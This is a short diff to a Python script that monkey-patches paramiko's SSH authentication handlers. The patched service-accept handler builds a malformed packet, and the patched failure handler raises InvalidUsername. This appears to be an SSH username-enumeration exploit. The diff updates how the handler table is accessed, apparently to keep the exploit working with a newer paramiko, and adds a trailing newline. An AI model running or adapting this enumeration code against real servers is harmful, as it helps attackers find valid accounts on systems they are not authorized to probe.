@@ -50,7 +50,7 @@ def apply_monkey_patch() -> None:
         pass
 
     auth_handler = paramiko.auth_handler.AuthHandler
-    old_msg_service_accept = auth_handler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
+    old_msg_service_accept = auth_handler._client_handler[paramiko.common.MSG_SERVICE_ACCEPT]
 
     def patched_msg_service_accept(*args, **kwargs):
         """ Patches paramiko.message.Message.add_boolean to produce a malformed packet. """
@@ -63,8 +63,10 @@ def apply_monkey_patch() -> None:
         """ Called during authentication when a username is not found. """
         raise InvalidUsername(*args, **kwargs)
 
-    auth_handler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = patched_msg_service_accept
-    auth_handler._client_handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = patched_userauth_failure
+    auth_handler._client_handler.update({
+        paramiko.common.MSG_SERVICE_ACCEPT: patched_msg_service_accept,
+        paramiko.common.MSG_USERAUTH_FAILURE: patched_userauth_failure
+    })
 
 def create_socket(hostname: str, port: int) -> Union[socket.socket, None]:
     """ Small helper to stay DRY.
@@ -159,3 +161,4 @@ def main():
 
 if __name__ == '__main__':
     main()
+
